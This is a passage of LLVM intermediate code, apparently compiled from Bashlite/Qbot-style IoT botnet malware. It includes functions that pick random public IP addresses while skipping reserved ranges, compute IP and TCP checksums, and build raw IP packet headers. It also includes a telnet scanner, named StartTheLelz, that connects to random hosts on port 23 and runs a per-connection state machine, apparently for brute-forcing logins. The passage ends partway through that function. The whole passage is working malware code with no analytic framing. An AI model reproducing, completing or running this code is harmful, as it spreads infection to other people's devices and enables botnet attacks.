; <label>:113:                                    ; preds = %109, %105
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 198
  br i1 %116, label %117, label %125

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 18
  br i1 %120, label %153, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 19
  br i1 %124, label %153, label %125

; <label>:125:                                    ; preds = %121, %113
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 198
  br i1 %128, label %129, label %137

; <label>:129:                                    ; preds = %125
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 51
  br i1 %132, label %133, label %137

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 100
  br i1 %136, label %153, label %137

; <label>:137:                                    ; preds = %133, %129, %125
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 203
  br i1 %140, label %141, label %149

; <label>:141:                                    ; preds = %137
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %149

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 113
  br i1 %148, label %153, label %149

; <label>:149:                                    ; preds = %145, %141, %137
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp sge i32 %151, 224
  br label %153

; <label>:153:                                    ; preds = %149, %145, %133, %121, %117, %109, %101, %89, %77, %65, %57, %53, %41, %37
  %154 = phi i1 [ true, %145 ], [ true, %133 ], [ true, %121 ], [ true, %117 ], [ true, %109 ], [ true, %101 ], [ true, %89 ], [ true, %77 ], [ true, %65 ], [ true, %57 ], [ true, %53 ], [ true, %41 ], [ true, %37 ], [ %152, %149 ]
  br i1 %154, label %155, label %165

; <label>:155:                                    ; preds = %153
  %156 = call i32 @rand() #2
  %157 = srem i32 %156, 255
  %158 = trunc i32 %157 to i8
  store i8 %158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %159 = call i32 @rand() #2
  %160 = srem i32 %159, 255
  %161 = trunc i32 %160 to i8
  store i8 %161, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = call i32 @rand() #2
  %163 = srem i32 %162, 255
  %164 = trunc i32 %163 to i8
  store i8 %164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %37

; <label>:165:                                    ; preds = %153
  %166 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 16, i32 16, i1 false)
  %167 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %169 = zext i8 %168 to i32
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %173 = zext i8 %172 to i32
  %174 = call i32 (i8*, i8*, ...) @szprintf(i8* %167, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.24, i32 0, i32 0), i32 %169, i32 %171, i32 %173)
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %176 = call i32 @inet_addr(i8* %175) #2
  store i32 %176, i32* %1, align 4
  br label %177

; <label>:177:                                    ; preds = %165, %11
  %178 = load i32, i32* %1, align 4
  ret i32 %178
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i8*, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %16 = call i32 @getdtablesize() #2
  %17 = sdiv i32 %16, 4
  %18 = mul nsw i32 %17, 3
  store i32 %18, i32* %3, align 4
  %19 = load i32, i32* %3, align 4
  %20 = icmp sgt i32 %19, 4096
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  br label %24

; <label>:22:                                     ; preds = %1
  %23 = load i32, i32* %3, align 4
  br label %24

; <label>:24:                                     ; preds = %22, %21
  %25 = phi i32 [ 4096, %21 ], [ %23, %22 ]
  store i32 %25, i32* %3, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call zeroext i16 @htons(i16 zeroext 23) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %30 = getelementptr inbounds [8 x i8], [8 x i8]* %29, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %30, i8 0, i64 8, i32 4, i1 false)
  %31 = load i32, i32* %3, align 4
  %32 = zext i32 %31 to i64
  %33 = call i8* @llvm.stacksave()
  store i8* %33, i8** %11, align 8
  %34 = alloca %struct.telstate_t, i64 %32, align 16
  %35 = bitcast %struct.telstate_t* %34 to i8*
  %36 = load i32, i32* %3, align 4
  %37 = sext i32 %36 to i64
  %38 = mul i64 %37, 5
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 %38, i32 16, i1 false)
  store i32 0, i32* %4, align 4
  br label %39

; <label>:39:                                     ; preds = %58, %24
  %40 = load i32, i32* %4, align 4
  %41 = load i32, i32* %3, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %61

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %45
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i32 0, i32 3
  store i8 1, i8* %47, align 1
  %48 = call noalias i8* @malloc(i64 1024) #2
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %50
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i32 0, i32 8
  store i8* %48, i8** %52, align 8
  %53 = load i32, i32* %4, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %54
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %55, i32 0, i32 8
  %57 = load i8*, i8** %56, align 8
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 1024, i32 1, i1 false)
  br label %58

; <label>:58:                                     ; preds = %43
  %59 = load i32, i32* %4, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %4, align 4
  br label %39

; <label>:61:                                     ; preds = %39
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 5, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

; <label>:64:                                     ; preds = %1175, %61
  br label %65

; <label>:65:                                     ; preds = %64
  store i32 0, i32* %4, align 4
  br label %66

; <label>:66:                                     ; preds = %1172, %65
  %67 = load i32, i32* %4, align 4
  %68 = load i32, i32* %3, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %1175

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %4, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  switch i32 %76, label %1171 [
    i32 0, label %77
    i32 1, label %234
    i32 2, label %390
    i32 3, label %477
    i32 4, label %545
    i32 5, label %669
    i32 6, label %737
    i32 7, label %881
    i32 8, label %909
    i32 9, label %937
    i32 10, label %965
    i32 11, label %993
  ]

; <label>:77:                                     ; preds = %70
  %78 = load i32, i32* %4, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 8
  %82 = load i8*, i8** %81, align 8
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 1024, i32 1, i1 false)
  %83 = load i32, i32* %4, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 3
  %87 = load i8, i8* %86, align 1
  %88 = icmp ne i8 %87, 0
  br i1 %88, label %89, label %109

; <label>:89:                                     ; preds = %77
  %90 = load i32, i32* %4, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 8
  %94 = load i8*, i8** %93, align 8
  store i8* %94, i8** %13, align 8
  %95 = load i32, i32* %4, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %96
  %98 = bitcast %struct.telstate_t* %97 to i8*
  call void @llvm.memset.p0i8.i64(i8* %98, i8 0, i64 32, i32 16, i1 false)
  %99 = load i8*, i8** %13, align 8
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 8
  store i8* %99, i8** %103, align 8
  %104 = call i32 @getRandomPublicIP()
  %105 = load i32, i32* %4, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 1
  store i32 %104, i32* %108, align 4
  br label %148

; <label>:109:                                    ; preds = %77
  %110 = load i32, i32* %4, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 5
  %114 = load i8, i8* %113, align 1
  %115 = add i8 %114, 1
  store i8 %115, i8* %113, align 1
  %116 = load i32, i32* %4, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 5
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i64
  %122 = icmp eq i64 %121, 14
  br i1 %122, label %123, label %134

; <label>:123:                                    ; preds = %109
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 5
  store i8 0, i8* %127, align 1
  %128 = load i32, i32* %4, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 4
  %132 = load i8, i8* %131, align 2
  %133 = add i8 %132, 1
  store i8 %133, i8* %131, align 2
  br label %134

; <label>:134:                                    ; preds = %123, %109
  %135 = load i32, i32* %4, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 4
  %139 = load i8, i8* %138, align 2
  %140 = zext i8 %139 to i64
  %141 = icmp eq i64 %140, 6
  br i1 %141, label %142, label %147

; <label>:142:                                    ; preds = %134
  %143 = load i32, i32* %4, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %144
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %145, i32 0, i32 3
  store i8 1, i8* %146, align 1
  br label %1172

; <label>:147:                                    ; preds = %134
  br label %148

; <label>:148:                                    ; preds = %147, %89
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext 23) #13
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %150, i16* %151, align 2
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %153 = getelementptr inbounds [8 x i8], [8 x i8]* %152, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %153, i8 0, i64 8, i32 4, i1 false)
  %154 = load i32, i32* %4, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  %161 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %162 = load i32, i32* %4, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 0
  store i32 %161, i32* %165, align 16
  %166 = load i32, i32* %4, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 16
  %171 = bitcast %struct.timeval* %12 to i8*
  %172 = call i32 @setsockopt(i32 %170, i32 1, i32 20, i8* %171, i32 16) #2
  %173 = load i32, i32* %4, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = bitcast %struct.timeval* %12 to i8*
  %179 = call i32 @setsockopt(i32 %177, i32 1, i32 21, i8* %178, i32 16) #2
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = icmp eq i32 %184, -1
  br i1 %185, label %186, label %187

; <label>:186:                                    ; preds = %148
  br label %1172

; <label>:187:                                    ; preds = %148
  %188 = load i32, i32* %4, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = load i32, i32* %4, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = call i32 (i32, i32, ...) @fcntl(i32 %197, i32 3, i8* null)
  %199 = or i32 %198, 2048
  %200 = call i32 (i32, i32, ...) @fcntl(i32 %192, i32 4, i32 %199)
  %201 = load i32, i32* %4, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %207 = call i32 @connect(i32 %205, %struct.sockaddr* %206, i32 16)
  %208 = icmp eq i32 %207, -1
  br i1 %208, label %209, label %224

; <label>:209:                                    ; preds = %187
  %210 = call i32* @__errno_location() #13
  %211 = load i32, i32* %210, align 4
  %212 = icmp ne i32 %211, 115
  br i1 %212, label %213, label %224

; <label>:213:                                    ; preds = %209
  %214 = load i32, i32* %4, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = call i32 @sclose(i32 %218)
  %220 = load i32, i32* %4, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 3
  store i8 1, i8* %223, align 1
  br label %233

; <label>:224:                                    ; preds = %209, %187
  %225 = load i32, i32* %4, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 2
  store i8 1, i8* %228, align 8
  %229 = load i32, i32* %4, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 6
  store i32 0, i32* %232, align 4
  br label %233

; <label>:233:                                    ; preds = %224, %213
  br label %1171

; <label>:234:                                    ; preds = %70
  %235 = load i32, i32* %4, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 6
  %239 = load i32, i32* %238, align 4
  %240 = icmp eq i32 %239, 0
  br i1 %240, label %241, label %247

